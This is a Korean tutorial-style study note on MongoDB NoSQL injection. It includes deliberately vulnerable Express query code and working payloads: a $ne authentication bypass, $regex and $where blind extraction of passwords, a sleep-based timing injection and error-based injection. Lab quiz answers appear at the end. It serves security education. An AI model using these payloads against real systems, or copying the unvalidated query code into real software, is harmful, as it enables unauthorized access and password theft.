
# NoSQL Injection

## NoSQL Injection

NoSQL Injection 은 이용자의 입력값이 쿼리에 포함되면서 발생하는 문제점이다.

여기에서는 MongoDB를 사용하는데, MongoDB의 NoSQL Injection 취약점은 이용자의 **입력값에 대한 타입 검증이 불충분**할 때 발생한다.

MongoDB는 자료형으로 **문자열, 정수, 날짜, 실수, 오브젝트, 배열** 등을 사용할 수 있다.

```js
const express = require('express');
const app = express();
app.get('/', function(req,res) {
    console.log('data:', req.query.data);
    console.log('type:', typeof req.query.data); // <- 여기
    res.send('hello world');
});
const server = app.listen(3000, function(){
    console.log('app.listen');
});
```

위의 코드는 **입력값과 타입을 출력**하는데 req.query의 타입이 **문자열로 지정되어 있지 않기** 때문에 **문자열 외의 타입이 입력될 수** 있습니다.  

아래의 코드는 위의 코드 실행 결과로, 각 **데이터의 type 을 출력**하는 코드이다.

```js
http://localhost:3000/?data=1234
data: 1234
type: string

http://localhost:3000/?data[]=1234
data: [ '1234' ]
type: object

http://localhost:3000/?data[]=1234&data[]=5678
data: [ '1234', '5678' ] 
type: object

http://localhost:3000/?data[5678]=1234
data: { '5678': '1234' } 
type: object

http://localhost:3000/?data[5678]=1234&data=0000
data: { '5678': '1234', '0000': true } 
type: object

http://localhost:3000/?data[5678]=1234&data[]=0000
data: { '0': '0000', '5678': '1234' } 
type: object

http://localhost:3000/?data[5678]=1234&data[1111]=0000
data: { '1111': '0000', '5678': '1234' } 
type: object
```

## NoSQL Injection 예시

```js
const express = require('express');
const app = express();
const mongoose = require('mongoose');
const db = mongoose.connection;
mongoose.connect('mongodb://localhost:27017/', { useNewUrlParser: true, useUnifiedTopology: true });
app.get('/query', function(req,res) {
    db.collection('user').find({
        'uid': req.query.uid, // <- 여기
        'upw': req.query.upw  // <- 여기
    }).toArray(function(err, result) {
        if (err) throw err;
        res.send(result);
  });
});
const server = app.listen(3000, function(){
    console.log('app.listen');
});
```

위의 코드는 user 컬렉션에서 이용자가 입력한 **uid, upw** 에 해당하는 **데이터를 찾고 출력** 하는 예제 코드입니다.

입력값에 대해 **타입을 검증하지 않기** 때문에 오브젝트 타입의 값을 입력할 수 있습니다.

```js
http://localhost:3000/query?uid[$ne]=a&upw[$ne]=a
=> [{"_id":"5ebb81732b75911dbcad8a19","uid":"admin","upw":"secretpassword"}]
```

**$ne 연산자** 를 사용해 uid와 upw가 **"a"가 아닌 데이터를 조회** 하는 공격 쿼리와 실행 결과이다.

## NoSQL Injection 실습(개정 이전 실습)

<img src="5.jpg">  

다음이 모듈을 구성하는 코드입니다. 코드를 보면 위에서 봤던 Figure 3 과 비슷합니다.

<img src="6.jpg">

이렇게 uid에 admin을 적고, **$ne** 를 통해 **upw 에 상관없이 uid가 admin 인 데이터를 조회**한다.

# Blind NoSQL Injection

## Blind NoSQL Injection

Blind NoSQL Injection 는 **참/거짓 결과**를 통해 **데이터베이스 정보**를 알아낼 수 있습니다.

|Name|Description|
|---|---|
|**$expr**|쿼리 언어 내에서 **집계 식을 사용**할 수 있습니다.|
|**$regex**|지정된 **정규식과 일치하는 문서**를 선택합니다.|
|**$text**|지정된 **텍스트를 검색**합니다.|
|**$where**|**JavaScript 표현식을 만족하는 문서**와 일치합니다.|

다음은 **MongoDB의 연산자**입니다.

## NoSQL 연산자와 표현식

### $regex : 정규식을 사용해 식과 일치하는 데이터를 조회

**^a** 는 정규식에서 **a로 문장이 시작**한다는 뜻

```bash
> db.user.find({upw: {$regex: "^a"}})
> db.user.find({upw: {$regex: "^b"}})
> db.user.find({upw: {$regex: "^c"}})
...
> db.user.find({upw: {$regex: "^g"}})
{ "_id" : ObjectId("5ea0110b85d34e079adb3d19"), "uid" : "guest", "upw" : "guest" }
```

### $where : 인자로 전달한 Javascript 표현식을 만족하는 데이터를 조회

참고 : **field에서 사용할 수 없음**

```bash
> db.user.find({$where:"return 1==1"})
{ "_id" : ObjectId("5ea0110b85d34e079adb3d19"), "uid" : "guest", "upw" : "guest" }
> db.user.find({uid:{$where:"return 1==1"}})
error: {
	"$err" : "Can't canonicalize query: BadValue $where cannot be applied to a field",
	"code" : 17287
}
```

#### (1) substring : Blind SQL Injection에서 한 글자씩 비교했던 것과 같이 데이터를 알아냄

**upw** 의 첫 글자를 **하나씩 넣어서** 알아내는 방법

```bash
> db.user.find({$where: "this.upw.substring(0,1)=='a'"})
> db.user.find({$where: "this.upw.substring(0,1)=='b'"})
> db.user.find({$where: "this.upw.substring(0,1)=='c'"})
...
> db.user.find({$where: "this.upw.substring(0,1)=='g'"})
{ "_id" : ObjectId("5ea0110b85d34e079adb3d19"), "uid" : "guest", "upw" : "guest" }
```

#### (2) Sleep : 지연 시간을 통해 참/거짓 결과를 확인

```bash
db.user.find({$where: `this.uid=='${req.query.uid}'&&this.upw=='${req.query.upw}'`});
/*
/?uid=guest'&&this.upw.substring(0,1)=='a'&&sleep(5000)&&'1
/?uid=guest'&&this.upw.substring(0,1)=='b'&&sleep(5000)&&'1
/?uid=guest'&&this.upw.substring(0,1)=='c'&&sleep(5000)&&'1
...
/?uid=guest'&&this.upw.substring(0,1)=='g'&&sleep(5000)&&'1
=> 시간 지연 발생.(즉, 이 쿼리가 참이라는 것이다.)
*/
```

#### (3) Error based Injection : 올바르지 않은 문법을 입력해 고의로 에러를 발생

```bash
> db.user.find({$where: "this.uid=='guest'&&this.upw.substring(0,1)=='g'&&asdf&&'1'&&this.upw=='${upw}'"});
error: {
	"$err" : "ReferenceError: asdf is not defined near '&&this.upw=='${upw}'' ",
	"code" : 16722
}
// this.upw.substring(0,1)=='g' 값이 참이기 때문에 asdf 코드를 실행하다 에러 발생
> db.user.find({$where: "this.uid=='guest'&&this.upw.substring(0,1)=='a'&&asdf&&'1'&&this.upw=='${upw}'"});
// this.upw.substring(0,1)=='a' 값이 거짓이기 때문에 뒤에 코드가 작동하지 않음
```

# NoSQL Injection 실습

## NoSQL Injection 실습

**추후에 추가**

# Blind NoSQL Injection 실습(개정 이전 실습)

## Blind NoSQLi 실습

다음은 Blind NoSQLi 실습입니다.

<img src="13.jpg">  

저는 여기에서는 **$regex** 를 사용했습니다.

<img src="14.jpg">  <img src="15.jpg">  

위의 그림을 보면 **{"$regex":"^a"}** 를 해서 result가 **uid**가 나온 것을 보고, **첫 번재 글자는 a** 라는 것을 알 수 있습니다.

이와 다르게 **{"$regex":"^b"}** 를 적으면 result 에서 **undefined** 를 출력하는 것을 볼 수 있습니다.

이렇게 하나씩 넣어서 알 수 있습니다.

<img src="16.jpg">  

결국 비밀번호가 **apple** 인 것을 알 수 있습니다.

## Blind NoSQLi 실습 풀이

<img src="17.jpg">  

풀이를 보던 중 **{"$regex":".{5}"}** 등을 통해 길이를 알 수 있다는 것을 알았습니다.

# 퀴즈

1. Blind NoSQL Injection 실습 모듈에서 획득한 admin의 비밀번호는 (A) 이다.  
**답 : apple**

2. MongoDB는 데이터의 자료형으로 오브젝트와 배열을 사용할 수 있다.  
**답 : O**